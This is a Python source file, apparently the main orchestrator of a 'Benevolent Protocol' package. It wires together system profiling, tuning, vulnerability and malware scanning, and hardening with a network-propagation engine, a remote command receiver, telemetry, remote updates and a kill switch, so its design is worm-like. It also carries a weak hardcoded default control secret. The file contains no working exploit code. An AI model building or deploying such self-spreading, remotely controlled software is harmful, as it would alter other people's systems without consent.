"""
Benevolent Protocol - Main Orchestrator
Coordinates all protocol modules and manages lifecycle
"""

import asyncio
import logging
import signal
import sys
from pathlib import Path
from typing import Optional, Dict, Any
from datetime import datetime
import json

# Core imports
from ..core import ProtocolCore
from ..analysis.system_profiler import SystemProfiler
from ..optimization.performance_tuner import PerformanceTuner
from ..safety.behavioral_constraints import BehavioralConstraints, OperationMode
from ..propagation.network_scanner import NetworkScanner
from ..propagation.propagation_engine import PropagationEngine
from ..protection.vulnerability_scanner import VulnerabilityScanner
from ..protection.security_hardener import SecurityHardener
from ..protection.malware_scanner import MalwareScanner
from ..protection.malware_remover import MalwareRemover
from ..control.kill_switch import KillSwitch, EmergencyLevel
from ..control.command_receiver import CommandReceiver, CommandType
from ..control.telemetry_sender import TelemetrySender, TelemetryLevel
from ..control.heartbeat_manager import HeartbeatManager
from ..control.update_receiver import UpdateReceiver

logger = logging.getLogger(__name__)


class BenevolentProtocol:
    """
    Main orchestrator for the Benevolent Protocol.
    
    Coordinates all modules:
    - Core: Lifecycle management
    - Analysis: System profiling
    - Optimization: Performance tuning
    - Safety: Behavioral constraints
    - Propagation: Network spreading
    - Protection: Security hardening
    - Control: Remote management
    """
    
    VERSION = "0.3.0-alpha"
    
    def __init__(self, 
                 config_path: Optional[str] = None,
                 protocol_dir: str = "/opt/benevolent_protocol"):
        
        self.config_path = config_path or "/etc/benevolent_protocol/config.json"
        self.protocol_dir = Path(protocol_dir)
        
        # Load configuration
        self.config = self._load_config()
        
        # Initialize all modules
        self._init_modules()
        
        # State tracking
        self._running = False
        self._start_time: Optional[datetime] = None
        self._main_task: Optional[asyncio.Task] = None
        
        logger.info(f"Benevolent Protocol v{self.VERSION} initialized")
    
    def _load_config(self) -> Dict[str, Any]:
        """Load configuration from file or use defaults"""
        default_config = {
            "telemetry_enabled": True,
            "telemetry_level": "standard",
            "telemetry_endpoint": None,
            "heartbeat_interval": 60,
            "command_port": 9527,
            "optimization_interval": 3600,
            "propagation_enabled": False,
            "gaming_mode_auto_detect": True,
            "max_cpu_percent": 30,
            "max_memory_mb": 500,
            "control_secret": "change_this_secret"
        }
        
        if Path(self.config_path).exists():
            try:
                with open(self.config_path, 'r') as f:
                    user_config = json.load(f)
                    default_config.update(user_config)
            except Exception as e:
                logger.warning(f"Failed to load config: {e}")
        
        return default_config
    
    def _init_modules(self):
        """Initialize all protocol modules"""
        
        # Core modules
        self.core = ProtocolCore()
        self.profiler = SystemProfiler()
        self.tuner = PerformanceTuner()
        self.constraints = BehavioralConstraints()
        
        # Protection modules
        self.vuln_scanner = VulnerabilityScanner()
        self.hardener = SecurityHardener()
        self.malware_scanner = MalwareScanner()
        self.malware_remover = MalwareRemover()
        
        # Propagation modules
        self.network_scanner = NetworkScanner()
        self.propagation = PropagationEngine()
        
        # Control modules
        self.kill_switch = KillSwitch(protocol_base_dir=str(self.protocol_dir))
        self.telemetry = TelemetrySender(
            endpoint=self.config.get("telemetry_endpoint"),
            level=TelemetryLevel(self.config.get("telemetry_level", "standard")),
            enabled=self.config.get("telemetry_enabled", True)
        )
        self.heartbeat = HeartbeatManager(
            endpoint=self.config.get("telemetry_endpoint"),
            interval=self.config.get("heartbeat_interval", 60)
        )
        self.updater = UpdateReceiver(
            update_endpoint=self.config.get("update_endpoint")
        )
        
        # Register kill switch hooks
        self.kill_switch.register_pre_shutdown_hook(self._pre_shutdown)
        self.kill_switch.register_post_shutdown_hook(self._post_shutdown)
        
        logger.info("All modules initialized")
    
    async def start(self):
        """Start the protocol"""
        if self._running:
            logger.warning("Protocol already running")
            return
        
        logger.info("Starting Benevolent Protocol...")
        self._running = True
        self._start_time = datetime.now()
        
        # Profile this system first
        await self._profile_system()
        
        # Start heartbeat
        await self.heartbeat.start()
        
        # Start main loop
        self._main_task = asyncio.create_task(self._main_loop())
        
        logger.info("Protocol started successfully")
    
    async def stop(self):
        """Stop the protocol gracefully"""
        if not self._running:
            return
        
        logger.info("Stopping Benevolent Protocol...")
        self._running = False
        
        # Stop heartbeat
        await self.heartbeat.stop()
        
        # Cancel main loop
        if self._main_task:
            self._main_task.cancel()
            try:
                await self._main_task
            except asyncio.CancelledError:
                pass
        
        logger.info("Protocol stopped")
    
    async def _profile_system(self):
        """Profile the current system"""
        logger.info("Profiling system...")
        
        try:
            profile = await self.profiler.profile()
            logger.info(f"System: {profile.os_type} {profile.os_version}")
            logger.info(f"CPU: {profile.cpu_model} ({profile.cpu_cores} cores)")
            logger.info(f"RAM: {profile.memory_total_gb:.1f} GB")
            
            self.telemetry.record_device_encountered()
            
        except Exception as e:
            logger.error(f"System profiling failed: {e}")
    
    async def _main_loop(self):
        """Main protocol loop"""
        while self._running:
            try:
                # Check kill switch
                if self.kill_switch.is_activated():
                    logger.info("Kill switch activated, stopping")
                    break
                
                # Check gaming mode
                if self.constraints.detect_gaming_mode():
                    await self._gaming_mode_cycle()
                else:
                    await self._normal_mode_cycle()
                
                # Sleep based on mode
                await asyncio.sleep(self._get_cycle_interval())
                
            except asyncio.CancelledError:
                break
            except Exception as e:
                logger.error(f"Main loop error: {e}")
                await asyncio.sleep(60)
    
    async def _gaming_mode_cycle(self):
        """Ultra-low impact cycle for gaming"""
        # Only critical security monitoring
        # Minimal CPU/memory usage
        pass
    
    async def _normal_mode_cycle(self):
        """Normal operation cycle"""
        # Perform optimization checks
        # Scan for vulnerabilities
        # Update telemetry
        self.telemetry.record_device_encountered()
    
    def _get_cycle_interval(self) -> int:
        """Get cycle interval based on mode"""
        if self.constraints.current_mode == OperationMode.GAMING:
            return 300  # 5 minutes in gaming mode
        return 60  # 1 minute normally
    
    def _pre_shutdown(self):
        """Pre-shutdown hook"""
        logger.info("Pre-shutdown: Saving state...")
    
    def _post_shutdown(self):
        """Post-shutdown hook"""
        logger.info("Post-shutdown: Cleanup complete")
    
    def get_status(self) -> Dict[str, Any]:
        """Get protocol status"""
        uptime = 0
        if self._start_time:
            uptime = int((datetime.now() - self._start_time).total_seconds())
        
        return {
            "version": self.VERSION,
            "running": self._running,
            "uptime_seconds": uptime,
            "start_time": self._start_time.isoformat() if self._start_time else None,
            "kill_switch_activated": self.kill_switch.is_activated(),
            "current_mode": self.constraints.current_mode.value,
            "telemetry": self.telemetry.get_stats(),
            "heartbeat": self.heartbeat.get_status()
        }
    
    async def optimize_system(self) -> Dict[str, Any]:
        """Run system optimization"""
        results = {
            "timestamp": datetime.now().isoformat(),
            "optimizations": []
        }
        
        # Profile first
        profile = await self.profiler.profile()
        
        # Get optimization plan
        plan = await self.tuner.create_optimization_plan(profile)
        
        # Apply optimizations (with safety checks)
        for opt in plan:
            if self.constraints.check_action_allowed(opt):
                result = await self.tuner.apply_optimization(opt)
                results["optimizations"].append({
                    "name": opt.name,
                    "success": result.success,
                    "message": result.message
                })
                
                if result.success:
                    self.telemetry.record_optimization_applied()
        
        return results
    
    async def scan_vulnerabilities(self) -> Dict[str, Any]:
        """Scan for vulnerabilities"""
        vulnerabilities = await self.vuln_scanner.scan()
        
        return {
            "timestamp": datetime.now().isoformat(),
            "total": len(vulnerabilities),
            "critical": len([v for v in vulnerabilities if v.severity.value >= 4]),
            "vulnerabilities": [{"id": v.id, "name": v.name, "severity": v.severity.value} for v in vulnerabilities]
        }
    
    async def scan_malware(self) -> Dict[str, Any]:
        """Scan for malware"""
        threats = await self.malware_scanner.scan()
        
        return {
            "timestamp": datetime.now().isoformat(),
            "total": len(threats),
            "threats": [{"name": t.name, "type": t.type, "severity": t.severity} for t in threats]
        }
    
    async def harden_security(self) -> Dict[str, Any]:
        """Apply security hardening"""
        # Scan first
        vulnerabilities = await self.vuln_scanner.scan()
        
        # Apply hardening
        results = await self.hardener.harden_system(vulnerabilities)
        
        return {
            "timestamp": datetime.now().isoformat(),
            "hardened": len([r for r in results if r.success]),
            "failed": len([r for r in results if not r.success]),
            "results": [{"vuln": r.vulnerability_id, "success": r.success} for r in results]
        }


async def main():
    """Main entry point"""
    # Setup logging
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    protocol = BenevolentProtocol()
    
    # Handle signals
    def signal_handler(sig, frame):
        logger.info(f"Received signal {sig}")
        asyncio.create_task(protocol.stop())
    
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # Start protocol
    await protocol.start()
    
    # Wait for stop
    while protocol._running:
        await asyncio.sleep(1)
    
    logger.info("Protocol exited")


if __name__ == "__main__":
    asyncio.run(main())
